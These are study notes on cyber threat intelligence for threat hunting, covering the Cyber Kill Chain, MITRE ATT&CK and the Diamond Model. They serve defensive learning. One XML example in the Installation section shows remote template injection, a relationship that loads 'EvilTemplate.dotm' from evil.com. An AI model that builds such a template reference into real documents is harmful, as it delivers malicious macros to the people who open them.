# Introduction to Cyber Threat Intelligence
Source: Threat Hunting with Elastic Stack
![](attachments/Pasted%20image%2020220922120826.png)

## Definition
Cyber Threat Intelligence (CTI) is the process of collection, analysis, and production with purpose to translate data into information and then into intelligence. The intelligence then, is used to enhance detection method.

Threat hunting is more than comparing indicators of compromis (IOCs) to collected data. Threat hunting searches for adversary activity that cannot be detected through the traditional signature-based defense. The activity includes profoling and detecting patterns on the endpoints and networks. 

Combination of CTI and threat hunting lead to data-driven decisions.

Example acticity: identifying adversary's binaries (i.e. PowerShell, GCC)

Models and Frameworks:
- The intelligence pipeline
- The Lockheed Martin Kill Chain
- The MITRE ATT&CK Matrix
- The Diamond Model

## The Intelligence Pipeline
The Intelligence pipeline introduces the theory that intelligence is made, and generally not provided.


![](attachments/Pasted%20image%2020220921100518.png)
Example of uninteresting data (the winds of internet): "this IP address was observed scanning for exposed unencrypted ports across the internet".

Example of information: "this IP address is scanning for exposed unencrypted ports across the internet for ASNs owned by banks". It has the context and interesting for financial services. That information is on its way to becoming intelligence.

To evolve that information into intelligence, you have to answer this question: "did this IP address scan my public environment and do I have any unencrypted ports?"

It is the job of analyst (the operator) to creat intelligence.

**Information Sharing anad Analysis Centers (ISACs)** are non-profit organization that provide central resource for gathering information on cyber threats as well as allow two way sharing of information between the private and public. 

## Cyber Kill Chain - Lockheed Martin
![](attachments/Pasted%20image%2020220922094255.png)

**Reconnaissance** is phase to mapping out the target. It can be done actively or passively through enumeration, social media profiling, vulnerability identification, security service identification, and define the target that may have a value (i.e. intellectual property).

**Weaponization** is one of the most expensive parts for the adversary. They must go into their arsenal of tools, tactics, and techniques, and identify exactly how they are going to leverage the information from previous phase. The weapon can be:
- Zero-day exploit
- Malware
- Living-Off-the-Land-Binary (LOLBin) - https://lolbas-project.github.io/
In this phase, adversaries acquire infrastructure to perform the initial entry, stage and launch payloads, perform command and control and locate exfiltration landing spot. Adversaries can use stolen (taking over someone's server to launch attack) or purchased. If adversaries using the stolen infrastructure:
- it easier to blend with normal traffic just lika a legitimate website traffic.
- adversareies don't have to put out any money
- it is harder to be traced back.''

**Delivery** is where the adversary makes their attempt to get into the target network. It may be done with:
- phishing
- insider
- hardware drop
- remotely exploited vulnerability
Defenders can detect whether they are being targeted by having visibility in this phase.

**Exploitation** is when the adversary exploits the target and executes code on the system. This either needs:
- Trick user into opening an attachment or link that executes an exploit condition (Arbitrary Code Execution (ACE)).
- Remotely run exploit on target system (Remote Code Execution(RCE)).

**Installation** is phasee when an initial payload is delivered as a result of the exploitation. Installation generally has multiple sub-phases, such as loading multiple tools/droppers onto the target to gain a good foothold and avoid anti-virus detection.
For example, this Macro:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/
package/2006/relationships"><Relationship Id="ird4"
Type=http://schemas.openxmlformats.org/officeDocument/2006/
relationships/attachedTemplate
Target="file:///C:\Users\admin\AppData\Roaming\Microsoft\
Templates\GoodTemplate.dotm?raw=true"
Targetmode="External"/></Relationships>
```
On that example, take note of `Target="file:///"` which defines the local template. Adversary also using the `Target=syntax` to load a remote template that includes malicious macros as stated below:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/
package/2006/relationships"><Relationship Id="ird4"
Type="http://schemas.openxmlformats.org/officeDocument/2006/
relationships/attachedTemplate"
Target="https://evil.com/EvilTemplate.dotm?raw=true"
Targetmode="External"/></Relationships>
```
This is allowed in the standard and a prime candidate for abuse. To avoid detection, attacker can also implement encryption and obfuscation on top of the payloads.

**Command & Control (C2)** is establishing remote access over the target. Adversary making sure that the C2 is able to evade detection and persist through normal system operation (reboot). To avoid being detected on this phase, adversary tend to slow down, often remain dormant between phases.

**Actions on the Objective** adversary performs the true goal of their intrusion.
- Adware
- Ransomware
- Exfiltrating sensitive information
- Dig deeper into the target and starts over the cycle with privileged access (this iscommon with ICS compromise)
- Using the server as infrastructure (i.e. proxychain)

**The job of analyst and incident responder:**
- Push the adversary as far back as possible into the chain, so the expense of attacking outweighs the value of success.
- Identify and share every piece of piece infrastructure detected
- Analyze and report every malware or LOLBin tactic uncovered
- Make adversary burn their zero-day exploit, then detect it and stop their advance.
- Make adversary work tremendously hard to make any advance in our network.


## MITRE ATT&CK Matrices
https://attack.mitre.org/matrices/
ATT&CK (Adversarial Tactics, Techniques and Common Knowledge) contains tactics and techniques commonly used, to describe adversary activities. There are three main matrices:
- Enterprise matrix: includes tactics and techniques focused on preparatory phases (just like CKC),  traditional operating systems, ICSes, and network-centric adversary tactics.
- Mobile matrix: focus on identifying post-exploitation adversary activities targeting Apple's iOS and the Android OS.
- ICS matrix: focused on identifying post-exploitation adversary activities targeting an ICS network.

These matrices are all built upon another MITRE framework called Cyber Analytics Repository (CAR) that purely focused on adversary analytics. 

ATT&CK matrices use a grouping schema of tactic and technique.
![](attachments/Pasted%20image%2020220922103626.png)

- Tactic is the highest level of the actor's behaviour (what they want to achieve - reconnaissance, resource development, initial access, etc).
- Technique is more detailed and carries the context of the tactics (what they are going to use to achieve their tactic - spear phishing, malware, etc)
- An analytic is highly detailed description of the behaviour and carries with it the context of the technique(for instance, the attacker will send an email with malicious content to achieve the initial access).

These are 14 tactics registered in ATT&CK 
1. **Reconnaissance** (PRE matrix only) - information collection on the target
2. **Resource Development** (PRE matrix only) - infrastructure acquisition and capabilities development
3. **Initial access**- gain initial foothold into the target environment
4. **Execution** - execute code within the target environment
5. **Persistence** - maintain access to the target environment
6. **Privilege Escalation** - escalate access within the target environment
7. **Defense Evasion** - avoid being detected
8. **Credential Access** - acquire internal/additional account credentials
9. **Discovery** - learning target environment (networks, services, etc)
10. **Lateral Movement** - expand access beyond the entry point
11. **Collection** - collect information or data for follow-on activities
12. **Command and Control** - Control implants within the target environment
13. **Exfiltration** - steal collected data from the target environment
14. **Impact** - deny, degrade, disrupt, or destroy assets, process, or operations in target environment


![](attachments/Tactic,%20Technique,%20Sub-technique.png)

## The Diamond Model
https://apps.dtic.mil/dtic/tr/fulltext/u2/a586960.pdf
by Center for Cyber Intelligence Analysis and Threat Research (CCIATR).
![](attachments/Pasted%20image%2020220922114456.png)

Diamond model uses a simple visual to illustrate six elements valuable for campaign tracking: Adversary, Infrastructure, Victim, Capabilities, Socio-Political, and Tactics, Techniques, and Procedures (TTP).

- **Adversary** (a): the threat actor involved in the campaign. Can be individual names, organizations, monikers, handles, social media profiles, code names, addresses (physical, email, etc), telephone numbers, employers, network-connected assets, and so on.
- **Infrastructure** (i): the adversary-controlled infrastructure. Can be IP addresses, hostnames, domain names, email addresses, network-connected assets, and so on.
- **Victim** (v): the target in the campaign. This can describe same things as the Adversary element, but within the context of the victim.
- **Capabilities** (c): Capabilities leveraged in the campaign.
- **Motivations**: describes high-level campaign objectives to help describe how the capabilities and infrastructure relate to, and leveraged by, one another. Four categories of MICE:
	- Money: include cash, gifts, status, political position, etc. A large majority of attackers are likely to fall under this category.
	- Ideology: specific (i.e. political) factor or fierce patroitism.
	- Coercion: motivating factor in that an actor has some sort of situation that can be use used as leverage to force them to carry out offensive actions (secret, sick family members, or having performed previous actions)
	- Ego: proofing ground that they are more skilled than others.
- **Directionality**: show how the nodes are assocated with each other. i.e. Victim-to-infrastructure(v2i), Infrastructure-to-victim(i2v), adversary-to-infrastructure(a2c),etc.

## Strategic, Operational, and Tactical Intelligence
- **Strategic** - who is launching this campaign and why they are doing it?
- **Operational** - what is happening throughout the campaign?
- **Tactical** - how did the adversary carry out the campaign?

Combination between elements of diamond and intelligence pipeline model/
![](attachments/Pasted%20image%2020220922120330.png)

Combination between CKC and the diamond model:
![](attachments/Pasted%20image%2020220922120524.png)


When you tightly couple intelligence analysis, processes, methodologies, and traditional SecOps you can begin threat hunting.

So the introduction to these models was really meant to help put you in the right mindset to approach threat hunting analytically, strategically, operationally, and tactically, and also to highlight that this is a team sport.